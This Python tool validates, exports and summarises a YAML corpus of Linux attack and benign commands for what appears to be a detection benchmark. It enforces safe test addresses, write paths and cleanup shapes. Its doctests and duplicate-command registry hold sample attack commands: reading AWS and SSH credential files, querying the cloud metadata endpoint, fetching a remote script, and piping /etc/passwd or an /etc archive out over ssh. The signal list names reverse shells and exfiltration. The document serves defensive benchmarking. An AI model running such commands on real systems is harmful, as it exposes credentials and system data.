#!/usr/bin/env python3
# -*- coding: ascii -*-
"""qinjing corpus tool: validate / TSV / stats for corpus/qinjing.yaml.

Parses the frozen YAML subset inherited from the xiezhi benchmark corpus
(two top-level list sections, item fields as "key: value" at fixed indent,
block lists "- entry", flow lists "[a, b]", single-quoted strings with ''
escapes; nothing else). Python 3 standard library only, ASCII source.

Usage:
    parse.py --validate <yaml>
        Lint the corpus; print every violation and exit 1 if any. Checks:
        unknown sections/fields, duplicate fields, duplicate ids, missing
        required fields, unknown signal classes (docs/02 section 3 word
        list), invalid expect/mode/impact/creates_process/platforms/tactic/
        technique values, expect-vs-expected_signals consistency, section
        vs expect consistency, duplicate-cmd gating (docs/11 T1): a cmd
        string used by two or more cases, across the false_positives and
        attacks sections or within one, fails unless the exact id group
        is registered in DUPLICATE_CMD_REGISTRY (the main corpus is
        pinned registry-exact in tests/selftest.sh); and cmd hygiene
        (docs/05 D10): every IPv4
        literal in cmd must be 203.0.113.x, 127.0.0.1, or 169.254.169.254
        (the link-local cloud metadata endpoint; never routed off-host,
        RFC1918 ranges called out separately); every bare domain must be
        example.com/org/net or end in .example/.invalid/.test/.localhost
        (RFC 2606; a dotted path right after the python -m flag is a
        module name, not a hostname); side-effect write targets (> >> redirects, tee, cp/mv/
        install destinations, -o/-O/-w/tar -f/of= output values) must live
        under /tmp/qinjing-*, while system trees (/etc /var /root /home
        /usr /boot) require impact temporary or destructive; no legacy
        /tmp/bench- paths; and every real-mode case with a local
        /tmp/qinjing-* scratch write carries a cleanup (docs/11 T6), so a
        re-run sweeps its own artifacts (remote ssh/scp writes and read
        sources are not local scratch writes).

    parse.py --tsv <yaml>
        Print runner input TSV: group, id, bucket, bin, cmd. Empty columns
        become "-"; the group column carries the bucket name when the case
        has one (same contract as the xiezhi runner TSV).

    parse.py --stats <yaml>
        Print the corpus content hash, total case count, section counts,
        bucket chain count, tactic coverage list, and impact distribution.

    parse.py --cleanup <yaml>
        Print "id<TAB>cleanup" for every case that carries a cleanup field;
        the runner's pre-run sweep executes these verbatim (docs/05 D11),
        so --validate pins the values to the "rm -f /tmp/qinjing-..." shape.

Self-tests: python -m doctest tools/parse.py
"""

import hashlib
import re
import sys

SECTIONS = ("false_positives", "attacks")
FIELDS = ("id", "tactic", "technique", "name", "platforms", "cmd", "bin",
          "creates_process", "mode", "expected_signals", "related_signals",
          "bucket", "expect", "impact", "cleanup", "verify_rc")
LIST_FIELDS = ("platforms", "expected_signals", "related_signals")
OPTIONAL_FIELDS = ("bucket", "cleanup", "verify_rc")

EXPECT_VALUES = ("detectable", "gap", "silent")
MODE_VALUES = ("real", "sim-missing-bin", "sim-builtin")
IMPACT_VALUES = ("none", "temporary", "destructive")
PLATFORM_VALUES = ("linux",)

# docs/02 section 3: the 52 signal classes (v0.2 + v0.3 governance rounds
# + r2 vocab-expansion round, mapping-notes section 27).
SIGNAL_CLASSES = frozenset((
    "suspicious_interpreter_exec", "download_and_execute", "reverse_shell",
    "fileless_execution", "c2_socket_script", "tunnel_tool_use",
    "tor_connection", "dns_tunneling", "persistence_cron_write",
    "persistence_systemd", "persistence_boot_script", "persistence_ssh_key",
    "persistence_pam", "account_creation", "sudoers_change",
    "credential_file_read", "credential_env_read", "cloud_metadata_access",
    "credential_dump_shadow", "capability_abuse_grant", "setuid_discovery",
    "audit_log_tamper", "history_clear", "file_attr_lock",
    "kernel_module_load", "ebpf_load", "lateral_ssh_tunnel",
    "net_scan_external", "net_recon_local", "cloud_cluster_recon",
    "system_discovery", "sniffer_run", "archive_staging", "db_mass_dump",
    "exfil_transfer", "cryptomining", "disk_wipe",
    "valid_account_remote_login", "webshell_write", "linker_hijack",
    "container_escape", "shell_config_persistence",
    "indicator_removal", "data_destruction", "timestomp",
    "at_job_persistence", "systemd_timer_persistence", "root_cert_install",
    "defense_service_stop", "git_hook_persistence", "account_discovery",
    "k8s_pod_exec",
))

TACTIC_RE = re.compile(r"^(TA\d{4}|BENIGN)$")
TECHNIQUE_RE = re.compile(r"^(T\d{4}(\.\d{3})?|NONE)$")

# Dotted quads only; the lookarounds keep version strings like "1.2.3.4.5"
# from partially matching.
IP_RE = re.compile(r"(?<![\d.])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?![\d.])")
TESTNET_RE = re.compile(r"^203\.0\.113\.\d{1,3}$")
RFC1918_RE = re.compile(r"^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)")

# Domain allowlist (docs/05 D10): RFC 2606 is to hostnames what TEST-NET is
# to addresses. Candidates are dotted multi-label names that start a token
# (or follow a scheme separator "://"), never sit inside a path, and do not
# read like python attribute access (os.system( -> followed by "(") or a
# snake_case tail (socket.create_connection -> followed by "_"). All-numeric
# candidates are IPv4 literals already owned by the checks above. Last
# labels that are file extensions (bench-beacon.service) are not hostnames.
# A candidate whose previous token is the python -m flag is a dotted module
# path (json.tool, http.server), not a hostname.
DOMAIN_LABEL = r"[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?"
DOMAIN_RE = re.compile(
    r"(?:(?<![\w./-])|(?<=://))(" + DOMAIN_LABEL + r"(\." + DOMAIN_LABEL + r")+)"
    r"(?![\w(-])")
DOMAIN_ALLOWED_EXACT = frozenset(("example.com", "example.org",
                                  "example.net", "localhost"))
DOMAIN_ALLOWED_SUFFIX = (".example.com", ".example.org", ".example.net",
                         ".example", ".invalid", ".test", ".localhost")
FILE_SUFFIX_LABELS = frozenset((
    "c", "h", "o", "so", "ko", "sh", "py", "rb", "pl", "php", "conf", "cnf",
    "ini", "service", "timer", "target", "mount", "gz", "bz2", "xz", "zip",
    "tar", "img", "iso", "pcap", "log", "key", "pub", "crt", "pem", "txt",
    "md", "bak", "old", "swp", "html", "htm", "js", "json", "yaml", "yml",
    "lock", "pid", "db", "sql",
))

# Side-effect path policy (docs/05 D10): writes under /tmp/qinjing- are the
# sanctioned scratch space at any impact; writes to system trees must be
# annotated temporary or destructive; any other /tmp prefix is an error.
# Everything else (e.g. /dev/null, raw devices, /sys pins) is outside this
# best-effort policy.
SYSTEM_WRITE_ROOTS = ("/etc", "/var", "/root", "/home", "/usr", "/boot")
REDIRECT_RE = re.compile(r"\d*(?:>>|>&|<>|>)\s*([^\s;&|]+)")
TAR_F_RE = re.compile(r"^-?[A-Za-z]*f[A-Za-z]*$")
SEGMENT_LINKS = frozenset(("&&", "||", ";", "|"))

# The runner executes cleanup values verbatim as root before every run
# (docs/05 D11), so the linted shape is the narrowest that still covers
# the corpus artifacts: one rm -f, operands under /tmp/qinjing- only.
# Subdirectories are allowed (git-hook artifacts live in .git/hooks/);
# a segment may carry one leading dot and dots only between alnum runs,
# so "." and ".." cannot match and no operand can traverse out of the
# scratch tree.
CLEANUP_SEGMENT = r"\.?[A-Za-z0-9_-]+(?:\.[A-Za-z0-9_-]+)*"
CLEANUP_OPERAND = r"/tmp/qinjing-%s(?:/%s)*" % (CLEANUP_SEGMENT,
                                                CLEANUP_SEGMENT)
CLEANUP_RE = re.compile(r"^rm -f( %s)+$" % CLEANUP_OPERAND)

# Registered same-cmd case groups (docs/11 T1; owner decision 5,
# 2026-11-19). A cmd string used by more than one case fails validate
# unless the exact id group is registered here. Validate also runs on
# fixtures and proposals, so it cannot demand registry entries be live;
# tests/selftest.sh pins the main corpus against this table in both
# directions (every entry live, no unregistered group). Zero case fields
# may change for these pairs (decision 5).
#   - FP66/VR079, FP111/VR641, FP113/VR643: deliberate opposite-label
#     uid-context discrimination probes: the benign group runs as root,
#     attack cases under per-case throwaway uids (tools/runner.sh
#     uid_for), so a uid-aware rule can satisfy both labels.
#   - FP05/S01: benign/attack identical-argv contrast held since the
#     original migration; S01 kept at gap (mapping-notes sections 8/27).
#   - C02/CB2, C07/CC1: chain steps reused as independent standalone
#     cases (mapping-notes section 28 reconciliation).
DUPLICATE_CMD_REGISTRY = frozenset((
    ("cat /root/.aws/credentials", frozenset(("C07", "CC1"))),
    ("cat /root/.ssh/id_rsa", frozenset(("C02", "CB2"))),
    ("groups root", frozenset(("FP113", "VR643"))),
    ("id root", frozenset(("FP111", "VR641"))),
    ("ip route show", frozenset(("FP66", "VR079"))),
    ("ps aux", frozenset(("FP05", "S01"))),
))


class CorpusError(Exception):
    pass


def unquote(raw):
    """Decode one YAML-subset scalar.

    >>> unquote(" systemctl ")
    'systemctl'
    >>> unquote("'it''s here'")
    "it's here"
    >>> unquote("[]")
    []
    >>> unquote("[a, 'b c']")
    ['a', 'b c']
    """
    raw = raw.strip()
    if raw == "[]":
        return []
    if raw.startswith("[") and raw.endswith("]"):
        inner = raw[1:-1].strip()
        if not inner:
            return []
        return [unquote(part) for part in inner.split(",")]
    if len(raw) >= 2 and raw.startswith("'") and raw.endswith("'"):
        return raw[1:-1].replace("''", "'")
    if len(raw) >= 2 and raw.startswith('"') and raw.endswith('"'):
        return raw[1:-1].replace('\\"', '"').replace("\\\\", "\\")
    return raw


def _apply(item, keyval, lineno):
    if ":" not in keyval:
        raise CorpusError("line %d: not key: value: %r" % (lineno, keyval))
    key, _, raw = keyval.partition(":")
    key = key.strip()
    if key not in FIELDS:
        raise CorpusError("line %d: unknown field %r" % (lineno, key))
    if key in item:
        raise CorpusError("line %d: duplicate field %r" % (lineno, key))
    value = unquote(raw)
    if key in LIST_FIELDS:
        if isinstance(value, list):
            item[key] = value
            return None
        if value == "":
            item[key] = []
            return key
        item[key] = [value]
        return None
    item[key] = value
    return None


def parse_lines(lines):
    """Parse the frozen subset into {"false_positives": [...], "attacks": [...]}.

    Each case dict carries an injected "group" key ("fp" or "attack"); list
    fields absent from the file are simply absent (validate reports them).

    >>> cases = parse_lines([
    ...     "attacks:",
    ...     "  - id: A01",
    ...     "    tactic: TA0002",
    ...     "    technique: NONE",
    ...     "    name: mini case",
    ...     "    platforms: [linux]",
    ...     "    cmd: 'nmap -sT 127.0.0.1'",
    ...     "    bin: nmap",
    ...     "    creates_process: false",
    ...     "    mode: sim-missing-bin",
    ...     "    expected_signals:",
    ...     "      - net_scan_external",
    ...     "    related_signals: []",
    ...     "    expect: detectable",
    ...     "    impact: none",
    ...     ])
    >>> cases["attacks"][0]["id"]
    'A01'
    >>> cases["attacks"][0]["expected_signals"]
    ['net_scan_external']
    >>> validate(cases)
    []
    """
    cases = {name: [] for name in SECTIONS}
    section = None
    item = None
    pending = None
    for lineno, line in enumerate(lines, 1):
        raw = line.rstrip()
        stripped = raw.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if not raw[:1].isspace() and raw.endswith(":"):
            name = stripped[:-1].strip()
            if name not in SECTIONS:
                raise CorpusError("line %d: unknown section %r" % (lineno, name))
            section, item, pending = name, None, None
            continue
        if section is None:
            raise CorpusError("line %d: content before any section" % lineno)
        if raw.startswith("  - "):
            item = {"group": "fp" if section == "false_positives" else "attack"}
            cases[section].append(item)
            pending = None
            if stripped[2:].strip():
                pending = _apply(item, stripped[2:], lineno)
            continue
        if item is None:
            raise CorpusError("line %d: field outside item" % lineno)
        if pending is not None and raw.startswith("      - "):
            item[pending].append(unquote(stripped[2:]))
            continue
        pending = None
        pending = _apply(item, stripped, lineno)
    return cases


def parse_corpus(path):
    with open(path, "rb") as fh:
        data = fh.read()
    try:
        text = data.decode("ascii")
    except UnicodeDecodeError as exc:
        raise CorpusError("%s: corpus must be pure ASCII (%s)" % (path, exc))
    return parse_lines(text.splitlines())


def _domain_candidates(cmd):
    """Dotted-name candidates worth checking against the allowlist.

    A candidate directly after the python -m flag is a dotted module path
    (python3 -m json.tool), never a hostname.

    >>> _domain_candidates("printf x | python3 -I -B -m json.tool")
    []
    >>> _domain_candidates("python3 -m http.server")
    []
    >>> _domain_candidates("dig AXFR evil.com")
    ['evil.com']
    """
    out = []
    for match in DOMAIN_RE.finditer(cmd):
        prev = cmd[:match.start()].rstrip().rsplit(None, 1)
        if prev and prev[-1] == "-m":
            continue
        cand = match.group(1)
        last = cand.rsplit(".", 1)[-1]
        if any(c.isalpha() for c in last) and last not in FILE_SUFFIX_LABELS:
            out.append(cand)
    return out


def _domain_allowed(cand):
    return cand in DOMAIN_ALLOWED_EXACT or \
        any(cand.endswith(suffix) for suffix in DOMAIN_ALLOWED_SUFFIX)


def _segments(cmd):
    """Whitespace tokens grouped into pipeline segments (cmd word first)."""
    segs = [[]]
    for tok in cmd.split():
        if tok in SEGMENT_LINKS:
            segs.append([])
        else:
            segs[-1].append(tok)
    return [seg for seg in segs if seg]


def _flag_target(cmdword, seg, i):
    """Output-flag value at position i, or None (docs/05 D10, best effort:
    -o/-O/-w values, tar -f archives, dd of=). Flags whose value is not an
    absolute path (ssh -o ConnectTimeout=3, wget -O -, nc -w 2) stay out."""
    tok = seg[i]
    nxt = seg[i + 1] if i + 1 < len(seg) else ""
    if tok in ("-o", "-O", "-w") and nxt.startswith("/"):
        return nxt
    if cmdword == "tar" and TAR_F_RE.match(tok) and nxt.startswith("/"):
        return nxt
    if tok.startswith("of=") and tok[3:].startswith("/"):
        return tok[3:]
    return None


def _write_targets(cmd):
    """Best-effort local write-target operands: > / >> redirects, tee
    operands, cp/mv/install destinations, mkfifo operands, and output-flag
    values. Read operands stay out, so cp /etc/hosts /tmp/x reports only
    /tmp/x. A tee input redirect (< file) is a source, not a target; a
    redirect inside an ssh/scp remote command lands on the remote host, not
    locally, so it stays out too (docs/11 T6).

    >>> _write_targets("cp /etc/hosts /tmp/qinjing-x")
    ['/tmp/qinjing-x']
    >>> _write_targets("tee -a /home/deploy/.ssh/authorized_keys < /tmp/qinjing-key.pub")
    ['/home/deploy/.ssh/authorized_keys']
    >>> _write_targets("ssh user@203.0.113.9 'cat > /tmp/qinjing-data' < /etc/passwd")
    []
    >>> _write_targets('tar -cf - /etc | ssh backup@203.0.113.40 "cat > /tmp/qinjing-bkp.tar"')
    []
    >>> _write_targets("mkfifo /tmp/qinjing-f")
    ['/tmp/qinjing-f']
    """
    targets = []
    for seg in _segments(cmd):
        head = seg[0]
        segtext = " ".join(seg)
        if head in ("ssh", "scp"):
            segtext = re.sub(r"'[^']*'", " '' ", segtext)
            segtext = re.sub(r'"[^"]*"', ' "" ', segtext)
        targets.extend(m.group(1) for m in REDIRECT_RE.finditer(segtext))
        if head in ("cp", "mv", "install") and len(seg) >= 3 \
                and seg[-1].startswith("/") and not seg[-1].startswith("-"):
            targets.append(seg[-1])
        elif head == "tee":
            skip = False
            for tok in seg[1:]:
                if tok == "<":
                    skip = True
                elif skip:
                    skip = False
                elif tok.startswith("/"):
                    targets.append(tok)
        elif head == "mkfifo":
            targets.extend(t for t in seg[1:] if t.startswith("/"))
        else:
            for j in range(1, len(seg)):
                got = _flag_target(head, seg, j)
                if got:
                    targets.append(got)
    return [t for t in targets if t.startswith("/")]


def _path_policy_error(path, impact):
    if path.startswith("/tmp/qinjing-"):
        return None
    if path.startswith("/tmp/"):
        return ("non-qinjing /tmp write target %s "
                "(side-effect paths must live under /tmp/qinjing-*)" % path)
    for root in SYSTEM_WRITE_ROOTS:
        if path == root or path.startswith(root + "/"):
            if impact not in ("temporary", "destructive"):
                return ("system write %s but impact=%s "
                        "(need temporary or destructive)" % (path, impact))
            return None
    return None


def cmd_hygiene_errors(cmd, impact="none"):
    """Target-address and side-effect lint for one cmd string.

    >>> cmd_hygiene_errors("nmap -sT 127.0.0.1")
    []
    >>> cmd_hygiene_errors("curl http://203.0.113.10/x.sh")
    []
    >>> cmd_hygiene_errors("curl http://169.254.169.254/latest/meta-data/")
    []
    >>> cmd_hygiene_errors("nmap -sS 192.168.122.0/24")
    ['internal-range target address 192.168.122.0 (allowed: 203.0.113.0/24, 127.0.0.1, 169.254.169.254)']
    >>> cmd_hygiene_errors("dig AXFR e.example @8.8.8.8")
    ['non-TEST-NET target address 8.8.8.8 (allowed: 203.0.113.0/24, 127.0.0.1, 169.254.169.254)']
    >>> cmd_hygiene_errors("dig AXFR evil.com @203.0.113.53")
    ['non-TEST domain evil.com (allowed: example.com/org/net, suffixes .example/.invalid/.test/.localhost)']
    >>> cmd_hygiene_errors("dig AXFR evil.com")
    ['non-TEST domain evil.com (allowed: example.com/org/net, suffixes .example/.invalid/.test/.localhost)']
    >>> cmd_hygiene_errors("curl http://c2.tun.example.com/x")
    []
    >>> cmd_hygiene_errors('python2 -c "import os; os.system(1)"')
    []
    >>> cmd_hygiene_errors("printf x | python3 -I -B -m json.tool")
    []
    >>> cmd_hygiene_errors("tar -xzf archive.tar.gz")
    []
    >>> cmd_hygiene_errors("echo x > /tmp/qinjing-a")
    []
    >>> cmd_hygiene_errors("echo x > /tmp/evil", "temporary")
    ['non-qinjing /tmp write target /tmp/evil (side-effect paths must live under /tmp/qinjing-*)']
    >>> cmd_hygiene_errors("echo x >> /etc/cron.d/x")
    ['system write /etc/cron.d/x but impact=none (need temporary or destructive)']
    >>> cmd_hygiene_errors("echo x >> /etc/cron.d/x", "temporary")
    []
    >>> cmd_hygiene_errors("cp /etc/hosts /tmp/x")
    ['non-qinjing /tmp write target /tmp/x (side-effect paths must live under /tmp/qinjing-*)']
    >>> cmd_hygiene_errors("cp /etc/hosts /tmp/qinjing-copy")
    []
    >>> cmd_hygiene_errors("systemctl enable bench-beacon.service")
    []
    """
    problems = []
    for addr in IP_RE.findall(cmd):
        if addr == "127.0.0.1" or addr == "169.254.169.254" or TESTNET_RE.match(addr):
            continue
        if RFC1918_RE.match(addr):
            problems.append("internal-range target address %s "
                            "(allowed: 203.0.113.0/24, 127.0.0.1, 169.254.169.254)" % addr)
        else:
            problems.append("non-TEST-NET target address %s "
                            "(allowed: 203.0.113.0/24, 127.0.0.1, 169.254.169.254)" % addr)
    for cand in _domain_candidates(cmd):
        if not _domain_allowed(cand):
            problems.append("non-TEST domain %s (allowed: example.com/org/net, "
                            "suffixes .example/.invalid/.test/.localhost)" % cand)
    for target in _write_targets(cmd):
        err = _path_policy_error(target, impact)
        if err:
            problems.append(err)
    if "/tmp/bench-" in cmd:
        problems.append("legacy /tmp/bench- path "
                        "(side-effect paths must live under /tmp/qinjing-*)")
    return problems


def duplicate_cmd_errors(cases):
    """Return duplicate-cmd lint errors (docs/11 T1); empty list = pass.

    Every cmd string shared by two or more cases, cross-section or within
    one section, must match a DUPLICATE_CMD_REGISTRY entry exactly. The
    three cross-section pairs with opposite expect labels are the
    deliberate uid-context probes registered by owner decision 5
    (2026-11-19). Fixtures without duplicates always pass; the main
    corpus is additionally pinned registry-exact in tests/selftest.sh.

    >>> duplicate_cmd_errors(parse_lines([
    ...     "false_positives:",
    ...     "  - id: Z01",
    ...     "    cmd: 'last -x'",
    ...     "    expect: silent",
    ...     "attacks:",
    ...     "  - id: Z02",
    ...     "    cmd: 'last -x'",
    ...     "    expect: detectable",
    ...     ]))
    ["Z01/Z02: duplicate cmd 'last -x' (cross-section, opposite expect labels) not registered in DUPLICATE_CMD_REGISTRY"]
    >>> duplicate_cmd_errors(parse_lines([
    ...     "attacks:",
    ...     "  - id: Z03",
    ...     "    cmd: 'last -x'",
    ...     ]))
    []
    >>> duplicate_cmd_errors(parse_lines([
    ...     "false_positives:",
    ...     "  - id: FP05",
    ...     "    cmd: 'ps aux'",
    ...     "attacks:",
    ...     "  - id: S01",
    ...     "    cmd: 'ps aux'",
    ...     ]))
    []
    """
    errors = []
    groups = {}
    for section in SECTIONS:
        for case in cases[section]:
            cmd = case.get("cmd", "")
            if cmd:
                groups.setdefault(cmd, []).append(
                    (case.get("id", "?"), section, str(case.get("expect"))))
    for cmd, members in sorted(groups.items()):
        if len(members) < 2:
            continue
        ids = frozenset(member[0] for member in members)
        if (cmd, ids) in DUPLICATE_CMD_REGISTRY:
            continue
        sections = sorted(set(member[1] for member in members))
        detail = ""
        if len(sections) > 1:
            detail = "cross-section"
            if "silent" in {member[2] for member in members} and \
                    len({member[2] for member in members}) > 1:
                detail += ", opposite expect labels"
        else:
            detail = "same-section"
        errors.append("%s: duplicate cmd %r (%s) not registered in "
                      "DUPLICATE_CMD_REGISTRY"
                      % ("/".join(sorted(ids)), cmd, detail))
    return errors


def validate(cases):
    """Return a list of lint error strings; empty list means the corpus passes.

    >>> bad = parse_lines([
    ...     "false_positives:",
    ...     "  - id: A01",
    ...     "    tactic: TA0002",
    ...     "    technique: NONE",
    ...     "    name: mini case",
    ...     "    platforms: [linux]",
    ...     "    cmd: 'nmap -sS 10.0.0.0/24'",
    ...     "    bin: nmap",
    ...     "    creates_process: false",
    ...     "    mode: real",
    ...     "    expected_signals: [exec-nmap]",
    ...     "    related_signals: []",
    ...     "    expect: detectable",
    ...     "    impact: none",
    ...     ])
    >>> for err in validate(bad):
    ...     print(err)
    A01: expect=detectable not allowed in false_positives (must be silent)
    A01: unknown signal class 'exec-nmap' in expected_signals
    A01: internal-range target address 10.0.0.0 (allowed: 203.0.113.0/24, 127.0.0.1, 169.254.169.254)
    >>> try:
    ...     parse_lines(["attacks:", "  - id: A01", "    oops: 1"])
    ... except CorpusError as exc:
    ...     print(exc)
    line 3: unknown field 'oops'
    """
    errors = []
    seen_ids = {}
    for section in SECTIONS:
        for case in cases[section]:
            cid = case.get("id", "<no id>")
            if "id" not in case:
                errors.append("case without id in %s" % section)
            elif cid in seen_ids:
                errors.append("%s: duplicate id (first seen in %s)"
                              % (cid, seen_ids[cid]))
            else:
                seen_ids[cid] = section
            for field in FIELDS:
                if field not in case and field not in OPTIONAL_FIELDS:
                    errors.append("%s: missing required field %r" % (cid, field))
            if case.get("expect") not in EXPECT_VALUES:
                errors.append("%s: invalid expect %r (need one of %s)"
                              % (cid, case.get("expect"), "/".join(EXPECT_VALUES)))
            elif section == "false_positives" and case["expect"] != "silent":
                errors.append("%s: expect=%s not allowed in false_positives "
                              "(must be silent)" % (cid, case["expect"]))
            elif section == "attacks" and case["expect"] == "silent":
                errors.append("%s: expect=silent not allowed in attacks" % cid)
            if case.get("mode") not in MODE_VALUES:
                errors.append("%s: invalid mode %r (need one of %s)"
                              % (cid, case.get("mode"), "/".join(MODE_VALUES)))
            if case.get("impact") not in IMPACT_VALUES:
                errors.append("%s: invalid impact %r (need one of %s)"
                              % (cid, case.get("impact"), "/".join(IMPACT_VALUES)))
            if case.get("creates_process") not in ("true", "false"):
                errors.append("%s: invalid creates_process %r"
                              % (cid, case.get("creates_process")))
            if not TACTIC_RE.match(case.get("tactic", "")):
                errors.append("%s: invalid tactic %r" % (cid, case.get("tactic")))
            if not TECHNIQUE_RE.match(case.get("technique", "")):
                errors.append("%s: invalid technique %r"
                              % (cid, case.get("technique")))
            for platform in case.get("platforms", []):
                if platform not in PLATFORM_VALUES:
                    errors.append("%s: unsupported platform %r (v1: linux only)"
                                  % (cid, platform))
            if case.get("cleanup") and not CLEANUP_RE.match(case["cleanup"]):
                errors.append("%s: cleanup must be 'rm -f /tmp/qinjing-...' "
                              "(got %r)" % (cid, case["cleanup"]))
            if case.get("mode") == "real" and not case.get("cleanup"):
                scratch = sorted({t.rstrip(";'\"") for t in
                                  _write_targets(case.get("cmd", ""))
                                  if t.startswith("/tmp/qinjing-")})
                if scratch:
                    errors.append("%s: real-mode local scratch write %s "
                                  "without cleanup (docs/11 T6; add "
                                  "'rm -f /tmp/qinjing-...')"
                                  % (cid, ", ".join(scratch)))
            for field in ("expected_signals", "related_signals"):
                for value in case.get(field, []):
                    if not isinstance(value, str) or not value:
                        errors.append("%s: bad entry %r in %s"
                                      % (cid, value, field))
                    elif value not in SIGNAL_CLASSES:
                        errors.append("%s: unknown signal class %r in %s"
                                      % (cid, value, field))
            signals = case.get("expected_signals", [])
            if case.get("expect") == "detectable" and not signals:
                errors.append("%s: expect=detectable but expected_signals "
                              "is empty" % cid)
            if case.get("expect") == "gap" and signals:
                errors.append("%s: expect=gap but expected_signals is "
                              "non-empty" % cid)
            for problem in cmd_hygiene_errors(case.get("cmd", ""),
                                              case.get("impact", "none")):
                errors.append("%s: %s" % (cid, problem))
    errors.extend(duplicate_cmd_errors(cases))
    return errors


def all_cases(cases):
    return cases["false_positives"] + cases["attacks"]


def dump_tsv(cases):
    rows = []
    for case in all_cases(cases):
        bucket = case.get("bucket", "") or "-"
        group = bucket if bucket != "-" else case["group"]
        rows.append("\t".join([group, case.get("id", ""), bucket,
                               case.get("bin", "") or "-",
                               case.get("cmd", "")]))
    return "\n".join(rows) + "\n"


def dump_stats(cases, corpus_sha256):
    fps = cases["false_positives"]
    atks = cases["attacks"]
    every = all_cases(cases)
    buckets = []
    tactics = []
    impacts = {name: 0 for name in IMPACT_VALUES}
    for case in every:
        bucket = case.get("bucket", "")
        if bucket and bucket not in buckets:
            buckets.append(bucket)
        tactic = case.get("tactic", "")
        if tactic and tactic not in tactics:
            tactics.append(tactic)
        if case.get("impact") in impacts:
            impacts[case["impact"]] += 1
    lines = [
        "corpus_sha256: %s" % corpus_sha256,
        "total_cases: %d" % len(every),
        "false_positives: %d" % len(fps),
        "attacks: %d" % len(atks),
        "buckets: %d" % len(buckets),
        "bucket_list: %s" % ", ".join(buckets),
        "tactics: %d" % len(tactics),
        "tactic_list: %s" % ", ".join(tactics),
        "impact_none: %d" % impacts["none"],
        "impact_temporary: %d" % impacts["temporary"],
        "impact_destructive: %d" % impacts["destructive"],
    ]
    return "\n".join(lines) + "\n"


def dump_cleanup(cases):
    rows = []
    for case in all_cases(cases):
        if case.get("cleanup"):
            rows.append("\t".join([case["id"], case["cleanup"]]))
    return "\n".join(rows) + ("\n" if rows else "")


def main(argv):
    if len(argv) != 3 or argv[1] not in ("--validate", "--tsv", "--stats",
                                         "--cleanup"):
        sys.stderr.write(__doc__)
        return 2
    try:
        cases = parse_corpus(argv[2])
    except CorpusError as exc:
        sys.stderr.write("parse error: %s\n" % exc)
        return 1
    except OSError as exc:
        sys.stderr.write("cannot read %s: %s\n" % (argv[2], exc))
        return 1
    if argv[1] == "--tsv":
        sys.stdout.write(dump_tsv(cases))
        return 0
    if argv[1] == "--stats":
        with open(argv[2], "rb") as fh:
            digest = hashlib.sha256(fh.read()).hexdigest()
        sys.stdout.write(dump_stats(cases, digest))
        return 0
    if argv[1] == "--cleanup":
        sys.stdout.write(dump_cleanup(cases))
        return 0
    errors = validate(cases)
    for err in errors:
        sys.stderr.write("%s\n" % err)
    if errors:
        sys.stderr.write("validate: %d error(s)\n" % len(errors))
        return 1
    sys.stdout.write("validate: OK, %d cases (%d fp, %d attack)\n"
                     % (len(all_cases(cases)), len(cases["false_positives"]),
                        len(cases["attacks"])))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
